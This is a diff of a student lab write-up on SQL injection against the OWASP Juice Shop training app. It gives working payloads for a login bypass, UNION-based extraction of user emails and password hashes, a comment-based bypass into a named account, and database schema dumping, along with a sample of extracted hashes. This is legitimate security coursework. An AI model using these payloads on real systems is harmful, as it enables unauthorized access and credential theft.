@@ -1,8 +1,6 @@
 # LAB 05_SQLI
 
 ## 1. Login Admin
-
-##### (Described just for study, the reports are the second and the third one)
 The first easier attack I try is called 'Login Admin'
 This challenge demonstrates a classic SQL Injection vulnerability on the login form.
 By manipulating the input fields, the attacker is able to alter the SQL query logic so that the authentication check is bypassed.
@@ -30,6 +28,8 @@ FROM users
 WHERE email = '' OR 1=1 -- ' 
 AND password = 'anything';
 ```
+<img src="./img/login_admin.png" alt="Login Admin" style="width:100%; height:auto;">
+Why specifically the admin? Because the application retrieves the first result from the 'all users' query, and the administrator is the first user in the database.
 
 This shows how improper input validation can allow unauthorized access to privileged accounts.
 
@@ -49,22 +49,45 @@ The attack was carried out in progressive steps:
    * that the endpoint was injectable,
    * that the UNION operator was accepted,
    * and that the number of columns matched the original query.
-     At this stage no real data was extracted; the goal was purely technical validation.
+   At this stage no real data was extracted; the goal was purely technical validation.
+
+   The query is probably something like this:
+    ```sql
+    SELECT id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt
+    FROM Products
+    WHERE name LIKE '%')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--%'
+    ...
+    ```
+   So it becomes something like:
+    ```sql
+    SELECT id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt
+    FROM Products
+    WHERE name LIKE '%'
+    UNION
+    SELECT 1,2,3,4,5,6,7,8,9 FROM users;
+    ```
 
 2. **Data exfiltration phase**
+
+   I can use the same url: `http://localhost:3000/rest/products/search?q=M%27))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9%20FROM%20users--`
+   To get this result with the name of the fields:
+   <img src="./img/1.png" alt="DOM XSS advanced payload" style="width:100%; height:auto;">
+   Why?
+   Two actions are performed simultaneously: 'M' causes the product search to fail, and 'UNION SELECT 1..9' injects a controlled SELECT statement.
+   Consequently, we can infer that the first three fields correspond to id, name, and description.
+
     `')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--`
    After confirming the correct column count, the numeric placeholders were replaced with real fields from the `Users` table. In this phase:
 
    * the first column was mapped to the user ID,
    * the second to the email,
    * the third to the password hash,
-     while the remaining columns were filled with neutral values.
-     This allowed real credentials to be returned inside the JSON response.
+   * while the remaining columns were filled with neutral values.
+
+This allowed real credentials to be returned inside the JSON response.
 
 3. **Result cleaning phase**
-    `M')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--`
-   A small modification was introduced at the beginning of the injected input to make the original product query return no rows (A random character was added at the beginning to ensure the original LIKE condition returned no rows)
-   This ensured that:
+    `M')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--`  
 
    * only the injected UNION results were displayed,
    * no legitimate product data was mixed with the extracted credentials,
@@ -87,7 +110,7 @@ The presence of the newly created account `giovanni@gmail.com` in the extracted 
 
 It is important to note that the application does not execute arbitrary SQL statements provided by the user. The input is embedded into a predefined query. Therefore, providing a standalone `SELECT` statement does not produce any effect. Only inputs that terminate the original string context and extend the existing query logic are able to alter the SQL executed by the backend.
 
-I created a small python script used to download and show the users and relative hashed passwords. The result is:
+I created a small python script (`user_credentials.py` in this folder) used to download and show the users and relative hashed passwords. The result is:
 ```bash
 admin@juice-sh.op : 0192023a7bbd73250516f069df18b500
 jim@juice-sh.op : e541ca7ecf72b8d1286474fc613e5e45
@@ -116,7 +139,35 @@ This challenge demonstrates that SQL Injection vulnerabilities are not limited t
 
 ----
 
-## 3. Database Schema
+## 3. Bypassing authentication
+We have identified the accounts present in the system. For example, Emma: `emma@juice-sh.op`  
+
+The objective is to access the portal using this account by bypassing the authentication mechanism.
+Attempts to manipulate the password field were deemed ineffective, as the password is hashed before comparison with the stored database value. Consequently, the focus remains solely on the email field.
+The SQL query is likely structured as follows:
+```sql
+SELECT *
+FROM Users
+WHERE email = '<EMAIL>'
+  AND password = '<HASH_PASSWORD>';
+```
+Therefore, the email input should be: `emma@juice-sh.op'--`
+The resulting query becomes:
+```sql
+SELECT *
+FROM Users
+WHERE email = 'emma@juice-sh.op'--'
+  AND password = 'not relevant';
+```
+Effectively becoming:
+```sql
+SELECT *
+FROM Users
+WHERE email = 'emma@juice-sh.op';
+```
+<img src="./img/emma.png" alt="Emma bypass authentication" style="width:80%; height:auto;">
+
+## 4. Database Schema
 For this challenge, Burp Suite was used to intercept and manually manipulate the HTTP requests generated by the Juice Shop application. After starting Burp and opening the Juice Shop web interface, the browser traffic was routed through the Burp proxy. By navigating the application and performing a product search, the following request was identified: `GET /rest/products/search?q= HTTP/1.1`
 
 <img src="./img/db_schema/1.png" alt="DOM XSS advanced payload" style="width:80%; height:auto;">
@@ -200,7 +251,7 @@ To extract the schema, the numeric placeholders were replaced with real columns 
 
 
 This caused the response to include values such as:
-```
+```sql
 CREATE TABLE Users(...)
 CREATE TABLE Products(...)
 CREATE TABLE BasketItems(...)
@@ -213,7 +264,8 @@ To obtain a richer and more structured output, the following payload was used:
 ```
 fruit')) UNION SELECT type,name,tbl_name,rootpage,sql,NULL,NULL,NULL,NULL FROM sqlite_master --
 ```
-(`GET /rest/products/search?q=fruit%27))%20UNION%20SELECT%20type,name,tbl_name,rootpage,sql,NULL,NULL,NULL,NULL%20FROM%20sqlite_master%20--%20 HTTP/1.1`)
+(`GET /rest/products/search?q=fruit%27))%20UNION%20SELECT%20type,name,tbl_name,rootpage,sql,NULL,NULL,NULL,NULL%20FROM%20sqlite_master%20--%20 HTTP/1.1`)  
+
 This extracts:
 - type: object type (table, index, view),
 - name: object name,
